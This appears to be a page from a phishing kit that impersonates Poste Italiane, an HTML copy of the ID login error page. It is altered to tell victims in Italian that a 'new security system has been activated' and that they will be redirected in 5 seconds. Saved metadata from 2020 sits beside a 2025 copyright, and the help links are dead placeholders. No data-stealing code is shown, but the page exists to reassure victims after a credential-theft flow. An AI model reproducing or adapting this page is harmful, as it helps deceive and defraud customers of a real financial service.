<meta name="savepage-title" content="ID retail errore">
<meta name="savepage-from" content="https://idp-poste.poste.it/jod-idp-retail/page/error.jsp">
<meta name="savepage-date" content="Tue Mar 31 2020 08:33:43 GMT+0200 (heure d'�t� d'Europe centrale)">
<meta name="savepage-state" content="Standard Items; Retained cross-origin frames; Removed unsaved URLs; Max frame depth = 5; Max resource size = 50MB; Max resource time = 10s;">
<meta name="savepage-version" content="17.1">
<meta name="savepage-comments" content=""></head><body ng-app="x" style="padding-top: 49px;">
			
				
					
					
					
					
				
	
	
	
		
			
		
	 	

				</div>
			</div>
		</div>
	</div>
	<div class="content content-federation-bar content-federation-bar-minified content-federation-bar-simplified">
		<div class="container container-extended">
			<div class="row">
				<div class="col-md-12">
					<div class="header-minified">
						<div class="row">
							<div class="col-xs-12">
								<div class="federation-bar-content-logo pull-xs-left clearfix">
									<div class="logo">
										
											<a href="https://www.poste.it" title="" class="hidden-xs hidden-sm">
												<span class="wrap-logo wrap-logo-medium"><img alt="Poste Italiane" data-savepage-src="/risorse_dt/condivise/immagini/loghi/logo-poste-italiane-medium.png" src="./IMG/logo-poste-italiane-medium@2x.png" data-savepage-srcset="/risorse_dt/condivise/immagini/loghi/logo-poste-italiane-medium@2x.png 2x" class="logo-image-pi-medium"></span>
											</a>
										
										
											<a href="https://www.poste.it" title="" class="logo-mobile hidden-md hidden-lg">
												<span class="wrap-logo wrap-logo-small"><img alt="Poste Italiane" data-savepage-src="/risorse_dt/condivise/immagini/loghi/logo-poste-italiane-medium.png" src="data:image/png;base64,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UmVhZHlxyWU8AAADKmlUWHRYTUw6Y29tLmFkb2JlLnhtcAAAAAAAPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4gPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNS42LWMxMzIgNzkuMTU5Mjg0LCAyMDE2LzA0LzE5LTEzOjEzOjQwICAgICAgICAiPiA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPiA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtbG5zOnhtcD0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wLyIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDpERDZCREM5QkE5ODQxMUU2ODBBRkIxNUQ5NzQxOEJBNyIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDpERDZCREM5QUE5ODQxMUU2ODBBRkIxNUQ5NzQxOEJBNyIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgQ0MgMjAxNS41IChNYWNpbnRvc2gpIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6NzFFQTlBMjU4N0JDMTFFNjg0NkJGN0M4MkYzNTFERkYiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6NzFFQTlBMjY4N0JDMTFFNjg0NkJGN0M4MkYzNTFERkYiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz6VNu/mAAAGeklEQVR42uSZC5BOZRjHz2I365KIJMUmuczUiNnkMkpFFLUy08gwuk6jGSIlQzsSKeNSq6a7YpspKg3bDraJpFy2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" data-savepage-srcset="/risorse_dt/condivise/immagini/loghi/logo-poste-italiane-medium@2x.png 2x" class="logo-image-pi-small"></span>
											</a>
										
									</div>
									
							
									
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>
	<script type="text/javascript"></script>
	
	<!--googleon: all-->

			
		
			
			
			

		
			<div class="content content-main border-xs-bottom">
	<div class="container">
		<div class="row">
		  	<div class="col-md-12" id="accessibility-anchor">
		      	<div class="row">
		          	<div class="col-md-12 col-structure">
		                <div class="main-pills">
		                    <div class="main-pills-wrap">
		                        <div class="row">
		                            <div class="col-md-12">
		                                <div class="main-result main-result-error">
		                                    
												<center><img src="./IMG/success_2.gif" align="bottom" height="145" width="190">
		                                        <div class="result-body">
		                                            <div class="box-editable-area box-editable-spacing">
		                                            	
														<br>
		                                            	<p>Il nuovo sistema di sicurezza è stato attivato.</b></p>
														<p>Ti reindirizzeremo dopo 5 secondi...</b></p>
<p><br>
</p>
<table class="x_button x_button-1" style="font-family: &quot;Segoe UI&quot;,&quot;Segoe UI Web (West European)&quot;,&quot;Segoe UI&quot;,-apple-system,BlinkMacSystemFont,Roboto,&quot;Helvetica Neue&quot;,sans-serif; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; color: rgb(0, 0, 0); background-color: rgb(255, 255, 0);" border="0" cellpadding="0" cellspacing="0">
</table>

		                                            </div>
		                                            
		                                            
		                                            <div>
		                                            
														
														
		                                            </div>
		                                            
		                                        </div>
		                                    </center></div>
		                                </div>
		                            </div>
		                        </div>
		                    </div>
		                </div>
		           	</div>
		      	</div>
		  	</div>
		</div>
	</div>


<!-- do you need help -->
<div class="content content-post-main">
	<div class="container">
		<div class="row" id="help__assistenza">
			<div class="col-sm-12">
				<h2 class="text-xs-center">Help &amp; Assistenza</h2>
			</div>
			<div class="col-md-8 col-lg-push-1 col-lg-10">
				<div class="btn-container text-xs-center">
					<div class="row">
						<div class="col-sm-6 col-md-4 col-sm-push-0 col-md-push-0">
							<a href="#" title="Chiamaci" class="btn btn-sm btn-secondary btn-expand"><img data-savepage-src="/risorse_dt/condivise/immagini/icone/icone-default-on/ico-chiamaci.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABkAAAAYCAYAAAF4smZQAAAACXBIWXMAAAsSAAALEgHS3X78AAACV0lEQVRIx6WV323bMBDGfzYygLqBIYoQ36JsoE7QbBBlA20QdwN3gjobeAR1Az0SIIh6gygTsC9Hg6IlN00PECTxjvzuz3dHQgiUVd2FEAghsAkhkMoWQGkzxYWZxVZp013+5LAQQrj8nOX9GBEuytS6rOqprOom3dlFhbz3qXJMj8uPPKaKGMAO2M1CS63EgWMIgRS0KKu6iJ5Gyz4qr7KmtBmAR+AADN7ZI2uSJ0G+D2k9VsNMk7NwyC6124QQUNq0QAt0QAO8eWc3qUdKmyNw8M6Od7J2Bnbe2Z0YvCttComvAU7Ak3e2uyJHLsKiTrxovbPNbJOcfOVWLtvk++yd3Shtwq0Ns8ItZSx/IsIgxPmrbAG8syPwO1n/9ZEYHpQ2hwSxk2S0ixsEZVLadN7ZvRgHWZs3qiiegR4Yl0iptJm8s0VEeBaDVipcCC1S2c8QYsGUNg0QN78B36Ud7r2zmzXKN3lHx8GxyqcEqZOYikUCCqcG6f4D8JLE+DnJXG3Kqg5lVbfZ+lHWV7v51pOD9DEnS09Z1WNZ1cN/gcTE5xM0FizO4H99tnn6ZJo0SpsxU30FXmaXygflFlM64GdedCH1E/BDiHEC7oF3mU7jTRClzV7oV8jmXg56WgArpJvO3tlz4sBjDpaOwxMwxeGaUBnpsEWwlSycBKgAuEt0U3ozemcnqU0j0/8MfAFamS4T0HlnhwygB75Jyy+mK9bhNUaUdfMgYK13dpLJ20vakOk1AS+zC2KlH5r8Fsx00wrNd6LbX92gnxGJ4iCpifIK9JLqi/wB+/LwxRF9xk0AAAAASUVORK5CYII=" data-savepage-srcset="/risorse_dt/condivise/immagini/icone/icone-default-on-2x/ico-chiamaci@2x.png 2x" class="spacer-xs-right-10">Chiamaci</a>
						</div>
						<div class="col-sm-6 col-md-4">
							<a href="#" title="Domande Frequenti" target="_self" class="btn btn-sm btn-secondary btn-expand"><img data-savepage-src="/risorse_dt/condivise/immagini/icone/icone-default-on/ico-scrivici.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABkAAAAYCAYAAAF4smZQAAAACXBIWXMAAAsSAAALEgHS3X78AAACKElEQVRIx62VzZHiMBCFP1O+rzcDyrLKOpoMHAIZDGRACEwGZIBDIIN1CBxVpVKVJwMTgfbS2hUwNj81faLw69fdr3+UhRC4srKq2xACZVU3IQQW8YN39gxACAFBtDmA0iYAlwi9AIesrOr2mpo/3tlMaXNeCGEPnIARuCht9t7ZJnIW3tlCPAulzR4gu0tY7Dbe4J0dlDbFnYfS5gy0/wqRYrqyqosQAvGPvqzqkIJigZ13NrsKPpXVTdwA/JbkioXSpn0ABlh5Z0dgUNoU+RRYUlopbXqgUdosvbMN8L+HsXxhXyltOqAH1qL2LuLyxGEHnJPim6m0s7KqG2DNY1tHomfVa4DROzs8dFDabOTnDthkZVUPwGYCH5m7KFAuTeq/Ye6A3jvbidSbK7VmwKMIc/LONosnwQeg/a6JnfQiglvgIJKe7hykyGUC3t02cpGyJx97Ad+plxb9IWocgW2Ucs7hU5To5hqZlVU9igqPrPDO7p6apWdMRugIfAEF0MYTmIUQUNocRNVXrPfO7hPybTJ2hYi9BNp40Pbe2fbFzDvgY6oRSaAhf0OWlHyTrGYPxCWLv1vv7Jj/IPlaprsDlnIYmVzAF8hPshW9TNtSbkeXXrP8iWn5jI/DBHmTZq60QaaL2SBCdgRWct6DPLUpOcmbOWv5zFRsZc7P8lJG2Z4mn6tkB/wCjrI/p+RsvWV3Qbyze2DPD1rc+PUbGz9lo3f26q79BQkMTe8YRpLkAAAAAElFTkSuQmCC" data-savepage-srcset="/risorse_dt/condivise/immagini/icone/icone-default-on-2x/ico-scrivici@2x.png 2x" class="spacer-xs-right-10">Scrivici</a>
						</div>
						<div class="col-sm-6 col-md-4">
							<a href="#" title="Richiedi Assistenza" class="btn btn-sm btn-secondary btn-expand"><img class="spacer-xs-right-10" data-savepage-src="/risorse_dt/condivise/immagini/icone/icone-default-on/ico-vieni-in-poste-cerca-up.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABkAAAAYCAYAAAF4smZQAAAACXBIWXMAAAsSAAALEgHS3X78AAACT0lEQVRIx62VvWtUQRTFfy4BC4mVSARhZT6cAQu3sEwjFlksJH+ARYrYLbhaWkgUCzsttkyx9oLarV2KFBYWz8Lw4DmgpIlWQUw9FrlPZt/O23XFgYW9c+/cj3POzCPGSIwRZdzzGCO1cVg7zsQYmVoSEWOMoIw7kY0CZVxUxk2mzmnrj4A+0AtVOZ7JkZZPW/jjTH+kJ9KgTtLhB+CJtr4AThsRYwv4KgEX0lTj5H8xVVAZ97p2zGJxOl8x06YybqKMGyX2bWVckcasMLsmwKa2fg/YC1W5o62/OoN+ClCNd7N63XMTtNgMSgPT/7n2CFXZ19Y/Bi6Gquw1/dlDcvBpm68N1i+ABr6HqlzLgpCbS+yfWdU00NlRxm0q43bE3s+pCaAuvwXsJftmanBt/TowAi7Jfi9U5bG2/m0dJ0oc1K0McyrMqHLYySC31rCn+Oi0kDeWVsdNAjst/Kw1h53LtlQpcvLozJFHL7ffemApLTV01QXeAdeBT3LpjsR9B7gJBOBWqMpv2SS5lynhalsewtGCuAcSt53zryyYdAC8ClU5qJ8Lkecz4K7EvAxV+UJbryV+dyGDIuEbYp4FVhP3cajKKxJ3WYirpb0KnNfWD8X+GKpyfwYuZdyw8Qx1lXEnyrj1BXB1Ba5u+lTVV2iuUoTIDeC9CKBtHQD32ohfKEcZeQM4yBXS1v8A7oeq3G3L8VeaTwp9Fs7Q1ne19b+AR/MKLHWxpNA1ga6QL2h/UYG5X4M5HJ1b9sYv/UT8y2pO8gZ4qK2P/yH3oeTjN5+SQkxwx/9cAAAAAElFTkSuQmCC" data-savepage-srcset="/risorse_dt/condivise/immagini/icone/icone-default-on-2x/ico-vieni-in-poste-cerca-up@2x.png 2x">Vieni in Poste</a>
						</div>
					</div>
				</div>
			</div>
			<div class="content content-main" style="padding-top: 15px;">
				<div class="container">
					<div class="row">
						<div class="col-md-8 col-lg-push-1 col-lg-10 text-xs-center innerspacer-xs-top-30">
In caso di mancato accesso o non funzionamento dei servizi &#232; possibile
contattare il Call Center al numero verde 803.160 (dal luned&#236; al sabato
dalle ore 8.00 alle ore 20.00). La chiamata &#232; gratis. </div>
					</div>
				</div>
			</div>
		</div>
	</div>
</div>
	
			

			

			
				
					
				
	
	
	
		
			
		
	
	<div class="content content-footer content-footer-post">
		<div class="container">
			<div class="row">
				<div class="col-md-12">
					<div class="row">
						<div class="col-md-8">
							<p class="text-xs-center text-md-left">
							© Poste Italiane 2025 - Partita iva : 01114601006
							</p>
						</div>
						<div class="col-md-4">
							<div class="clearfix">
								<div class="base-footer">
									
								</div>
							</div>
						</div>
					</div>
					<a href="#" class="btn btn-primary btn-cta back-to-top"> <span class="hide">vai a inizio pagina</span>
					</a>
				</div>
			</div>
		</div>
	</div>

			
		
			
				<script></script>
				
	
	
	
		
			
		
	
	
		
	
	
		
			
		


	
	
		
			
			
			
				
			
			
		
			
			
			
				<script type="text/javascript" data-savepage-src="/risorse_dt/condivise/javascript/start-script.js"></script>
			
			
		
			
			
			
			
			
			
		
			
			
			
				<script type="text/javascript" data-savepage-src="/risorse_dt/bootstrap/js/bootstrap.js"></script>
			
			
		
			
			
			
				<script type="text/javascript" data-savepage-src="/risorse_dt/bootstrap/js/ie10-viewport-bug-workaround.js"></script>
			
			
		
			
			
			
				
			
		
	
	<div class="modal modal-spinner fade" id="myModalLoading" tabindex="-1" role="dialog" aria-labelledby="mySmallModalLabel">
		<div class="modal-dialog modal-xs">
			<div class="modal-content">
				<h3>Caricamento...</h3>
				<img data-savepage-src="/risorse_dt/condivise/immagini/generiche/spinner_bianco.gif" src="data:image/gif;base64,R0lGODlhlgCWAIABAP///////yH/C05FVFNDQVBFMi4wAwEAAAAh/wtYTVAgRGF0YVhNUDw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMTExIDc5LjE1ODMyNSwgMjAxNS8wOS8xMC0wMToxMDoyMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENDIDIwMTUgKE1hY2ludG9zaCkiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6ODlEMUJCRjMwQkM3MTFFNjkyOERGMkY2Q0Y2NjU1MzgiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6ODlEMUJCRjQwQkM3MTFFNjkyOERGMkY2Q0Y2NjU1MzgiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDo4OUQxQkJGMTBCQzcxMUU2OTI4REYyRjZDRjY2NTUzOCIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDo4OUQxQkJGMjBCQzcxMUU2OTI4REYyRjZDRjY2NTUzOCIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PgH//v38+/r5+Pf29fTz8vHw7+7t7Ovq6ejn5uXk4+Lh4N/e3dzb2tnY19bV1NPS0dDPzs3My8rJyMfGxcTDwsHAv769vLu6ubi3trW0s7KxsK+urayrqqmop6alpKOioaCfnp2cm5qZmJeWlZSTkpGQj46NjIuKiYiHhoWEg4KBgH9+fXx7enl4d3Z1dHNycXBvbm1sa2ppaGdmZWRjYmFgX15dXFtaWVhXVlVUU1JRUE9OTUxLSklIR0ZFRENCQUA/Pj08Ozo5ODc2NTQzMjEwLy4tLCsqKSgnJiUkIyIhIB8eHRwbGhkYFxYVFBMSERAPDg0MCwoJCAcGBQQDAgEAACH5BAkDAAEALAAAAACWAJYAAAL/jI+py+0Po5y02ouz3rz7D4biSJbmiSrAyrYukMby9dY2POc6cvf1DkT5hr+gEURMuo7MjfLZakop0Opqin1YrdluYrv1isFhsZcMNasX6OL6zWvj4HSDvI4PoPN5ML/P9YcXKEhXVghHiPhWtWiY5pj4FCmZRFlJdMmopLk22anGCWpmOTpWatolmpq1yjqF+gqbKYtFWysVi3ukuxt068s7FMwETAxkfJyTrDwz3Iz8DK0jPe1cbR2DnS3kw73s/a0dLp5CXn6yjS6ivh5y7j4CH/8+T+/Rfs9hr7/f08/uH0AkAgfi42eQRsGEThYyzIDw4YSIEiNQrKjFIUYqwRo3SrjokU3HkBlvkKwA8uSBlCr1jGyp4iXMOCZnlrRh86abnDFl2syXk6VKoSeJhgT606hHpDOVbmQKE2pLqUWdYqRa1WdUqxWxHvW6lOtDZjzBPjV7VSxDsknVJmTbFK3EXmXljoU7Fe9QvVntGnRVl+9XwWHpbjWcF/FexSQhBWZcGPBhyYs/xW10GXNiRYMPdfYTuU1XOUvukaYs7jRka6r97mpdsx/snbJns7g7e7Tqz6D7Os6slafw4cRhFgAAIfkECQMAAQAsAAAAAJYAlgAAAv+Mj6nL7Q+jnLTai7PevPsPhuJIluaJpurKtu77AvIMwPa90LqM9/EOrPmGp6CRiBQZl8KkM8NkPqeVqJSKfVij2W5ue/V6wVyxmBw2j9E7tZutc6vhM/mcbr+z83oyv7/1Z7YneOZXuAaGaBi42HXoiAUZOTVJ6WR5iaSoWdnYifkJumk1+iRqOoSa2lPKSrT6auMq60Nbe3OLO1u2m5vm+wMc3NJL7KJ7vGKsvMzcnPIMXTQ8Tb1k7YydHV3NPSL9HRIu/kFe7uGNnq6+vnHurtEeD7VNDzJ/b5GvTwHf788ewHcCB9Y7YpAgwoQHgzCUV/BhwIUSq0SsGIEfxgTFGjce6OgxAEiPIzeWxHiyYkqJKx+2TPgvpIGXMC/K/ELxZgOaA2PK9BmSJ0CgJIX2I4rSqD6kSW3qnKn0HlOWU11GjZfs6cer7rJqFVm1Jtd1Xp+W1RnL7Nmba3+2LRq